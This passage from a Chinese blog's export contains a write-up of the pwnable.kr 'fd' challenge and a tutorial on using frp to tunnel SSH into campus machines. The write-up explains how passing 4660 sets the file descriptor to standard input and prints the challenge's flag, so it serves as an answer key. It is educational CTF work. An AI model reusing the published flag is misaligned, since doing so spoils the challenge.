<h4 id="atoi-函数"><a href="#atoi-函数" class="headerlink" title="atoi()函数"></a>atoi()函数</h4><p><code>int atoi(const char *str)</code>&nbsp;</p>
<p>函数说明：把参数&nbsp;str&nbsp;所指向的字符串转换为一个整数（类型为 int 型）</p>
<h4 id="read-函数"><a href="#read-函数" class="headerlink" title="read()函数"></a>read()函数</h4><p><code>ssize_t read(int fd, void * buf, size_t count);</code>  </p>
<p>函数说明：read()会把参数fd所指的文件传送count 个字节到buf 指针所指的内存中。</p>
<p>返回值：返回值为实际读取到的字节数, 如果返回0, 表示已到达文件尾或是无可读取的数据。若参数count 为0, 则read()不会有作用并返回0。</p>
<h6 id="注意：read时fd中的数据如果小于要读取的数据，就会引起阻塞。"><a href="#注意：read时fd中的数据如果小于要读取的数据，就会引起阻塞。" class="headerlink" title="注意：read时fd中的数据如果小于要读取的数据，就会引起阻塞。"></a>注意：read时fd中的数据如果小于要读取的数据，就会引起阻塞。</h6><h4 id="解读："><a href="#解读：" class="headerlink" title="解读："></a>解读：</h4><h5 id="1-读取fd所指的文件，并把其中一定量的字符（这里是32个）放到buf中。只要构造出内容为“LETMEWIN-n”的文件就可以实现了。但是好像比较麻烦。"><a href="#1-读取fd所指的文件，并把其中一定量的字符（这里是32个）放到buf中。只要构造出内容为“LETMEWIN-n”的文件就可以实现了。但是好像比较麻烦。" class="headerlink" title="1.读取fd所指的文件，并把其中一定量的字符（这里是32个）放到buf中。只要构造出内容为“LETMEWIN\n”的文件就可以实现了。但是好像比较麻烦。"></a>1.读取fd所指的文件，并把其中一定量的字符（这里是32个）放到buf中。只要构造出内容为“LETMEWIN\n”的文件就可以实现了。但是好像比较麻烦。</h5><h5 id="2-题目提示：文件描述符（file-description）"><a href="#2-题目提示：文件描述符（file-description）" class="headerlink" title="2.题目提示：文件描述符（file description）"></a>2.题目提示：文件描述符（file description）</h5><h5 id="关于文件描述符："><a href="#关于文件描述符：" class="headerlink" title="关于文件描述符："></a>关于文件描述符：</h5><p><img src="/images/pasted-3.png" alt="upload successful"></p>
<h5 id="fd-0时直接就是standard-input，美滋滋。"><a href="#fd-0时直接就是standard-input，美滋滋。" class="headerlink" title="fd=0时直接就是standard input，美滋滋。"></a>fd=0时直接就是standard input，美滋滋。</h5><h5 id="直接就是int-fd-atoi-argv-1-0x1234的值为0，然后带一个参数即可。"><a href="#直接就是int-fd-atoi-argv-1-0x1234的值为0，然后带一个参数即可。" class="headerlink" title="直接就是int fd = atoi( argv[1] ) - 0x1234的值为0，然后带一个参数即可。"></a>直接就是<code>int fd = atoi( argv[1] ) - 0x1234</code>的值为0，然后带一个参数即可。</h5><h5 id="另外，注意：0x1234为16进制数，如果我们在参数输入时输入0x1234，atoi-函数会将0x1234中的x转为整型数字，因此数值会发生变化，此时应该使用进制转换将0x1234转换为十进制的4660再输入“LETMEWIN”即可获得flag。"><a href="#另外，注意：0x1234为16进制数，如果我们在参数输入时输入0x1234，atoi-函数会将0x1234中的x转为整型数字，因此数值会发生变化，此时应该使用进制转换将0x1234转换为十进制的4660再输入“LETMEWIN”即可获得flag。" class="headerlink" title="另外，注意：0x1234为16进制数，如果我们在参数输入时输入0x1234，atoi()函数会将0x1234中的x转为整型数字，因此数值会发生变化，此时应该使用进制转换将0x1234转换为十进制的4660再输入“LETMEWIN”即可获得flag。"></a>另外，注意：0x1234为16进制数，如果我们在参数输入时输入0x1234，atoi()函数会将0x1234中的x转为整型数字，因此数值会发生变化，此时应该使用进制转换将0x1234转换为十进制的4660再输入“LETMEWIN”即可获得flag。</h5><p><img src="/images/pasted-4.png" alt="upload successful"></p>
<h4 id="flag-mommy-I-think-I-know-what-a-file-descriptor-is"><a href="#flag-mommy-I-think-I-know-what-a-file-descriptor-is" class="headerlink" title="flag:mommy! I think I know what a file descriptor is!!"></a>flag:<code>mommy! I think I know what a file descriptor is!!</code></h4><script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>学习</category>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>pwnable</tag>
        <tag>文件描述符</tag>
      </tags>
  </entry>
  <entry>
    <title>使用frp实现内网穿透</title>
    <url>/frp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><h3 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h3><p>在学校常驻一台ubuntu18.04的台式机（IP地址：192.168.165.225），笔记本里有一台kali的虚拟机（IP地址：192.168.165.226），为了能在宿舍里和家里用ssh远程操作时时学习，故学习<strong>frp</strong>实现内网穿透。</p>
<h3 id="环境："><a href="#环境：" class="headerlink" title="环境："></a>环境：</h3><ul>
<li><strong>阿里云服务器：</strong><br>公网IP地址：47.101.209.132<br>操作系统：Centos 7.0</li>
</ul>
<ul>
<li><p><strong>Ubuntu18.04：</strong><br>内网IP地址：192.168.165.225<br>操作系统：Ubuntu 18.04</p>
<ul>
<li><strong>kali虚拟机：</strong><br>内网IP地址：192.168.165.226<br>操作系统：Kali</li>
</ul>
</li>
</ul>
<h3 id="frp实现原理："><a href="#frp实现原理：" class="headerlink" title="frp实现原理："></a>frp实现原理：</h3><p>   <a href="https://github.com/fatedier/frp">frp官方文档</a></p>
<h3 id="搭建过程："><a href="#搭建过程：" class="headerlink" title="搭建过程："></a>搭建过程：</h3><h4 id="阿里云服务器端："><a href="#阿里云服务器端：" class="headerlink" title="阿里云服务器端："></a>阿里云服务器端：</h4><h5 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h5><pre><code>    wget https://github.com/fatedier/frp/releases/download/v0.28.2/frp_0.28.2_linux_amd64.tar.gz

    sudo tar -zxvf frp_0.28.2_linux_amd64.tar.gz               --解压

    sudo mv frp_0.28.2_linux_amd64 frp_0.28.2           --重命名为frp_0.28.2     

    sudo rm -rf frp_0.28.2_linux_amd64.tar.gz           --删除相关的压缩包</code></pre>
<h5 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h5><pre><code>    sudo ./frps -c ./frps.ini               --后台启动为 sudo ./frps -c ./frps.ini &amp;</code></pre>
<h5 id="设置开机启动和后台运行"><a href="#设置开机启动和后台运行" class="headerlink" title="设置开机启动和后台运行"></a>设置开机启动和后台运行</h5><p> <a href="https://blog.csdn.net/qq_29726869/article/details/82871700">实现开机自启动的三种办法</a></p>
<p> 编辑开机启动文件：</p>
<pre><code>    vi /etc/systemd/system/frps.service</code></pre>
<p>在文件中写入：</p>
<pre><code>    [Unit]
    Description=frps daemon
    After=syslog.target  network.target
    Wants=network.target

     [Service]
     Type=simple
     ExecStart=绝对路径/frps -c 绝对路径/frps.ini 
     Restart= always
     RestartSec=1min

    [Install]
    WantedBy=multi-user.target</code></pre>
<p> 实现开机启动和后台启动：</p>
<pre><code>    systemctl start frps            --启动frps
    systemctl enable frps           --设置为开机启动</code></pre>
<h4 id="Ubuntu18-04-Kali"><a href="#Ubuntu18-04-Kali" class="headerlink" title="Ubuntu18.04 || Kali"></a>Ubuntu18.04 || Kali</h4><h5 id="下载-1"><a href="#下载-1" class="headerlink" title="下载"></a>下载</h5><pre><code>    wget https://github.com/fatedier/frp/releases/download/v0.28.2/frp_0.28.2_linux_amd64.tar.gz

    sudo tar -zxvf frp_0.28.2_linux_amd64.tar.gz               --解压

    sudo mv frp_0.28.2_linux_amd64 frp_0.28.2           --重命名为frp_0.28.2     

    sudo rm -rf frp_0.28.2_linux_amd64.tar.gz           --删除相关的压缩包     </code></pre>
<h5 id="编辑客户端配置文件"><a href="#编辑客户端配置文件" class="headerlink" title="编辑客户端配置文件"></a>编辑客户端配置文件</h5><pre><code>    sudo vim frpc.ini       --编辑客户端配置文件</code></pre>
<p>写入：</p>
<pre><code>    frpc.ini[common]server_addr = x.x.x.x               --服务器IP地址
    server_port = 7000

    [ssh]                                               --名字随便取
    type = tcp
    local_ip = 127.0.0.1
    local_port = 22
    remote_port = 6000


    [web]
    type = http #
    local_port = 8081 
    custom_domains = repo.iwi.com               --据说必须要有，但自己没有web穿透的需求，没试过。</code></pre>
<h5 id="启动："><a href="#启动：" class="headerlink" title="启动："></a>启动：</h5><pre><code>    sudo ./frpc -c ./frpc.ini               --后台启动为 sudo ./frpc -c ./frpc.ini &amp;</code></pre>
<h5 id="设置开机和后台启动"><a href="#设置开机和后台启动" class="headerlink" title="设置开机和后台启动"></a>设置开机和后台启动</h5><pre><code>    因为ubuntu18.04的开机启动项和之前版本发生了较大的变化，所以这方面的知识还有待学习。


    kali的方法和服务器端一致。</code></pre>
<p><a href="https://blog.csdn.net/dahuzix/article/details/80785691">在Ubuntu18.04中调整rc.local启动项</a></p>
<h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ul>
<li>记得开放阿里云安全组策略</li>
<li>客户端和服务器端需要使用相同的frp版本</li>
</ul>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>内网穿透</tag>
        <tag>frp</tag>
        <tag>linux</tag>
      </tags>
  </entry>
</search>
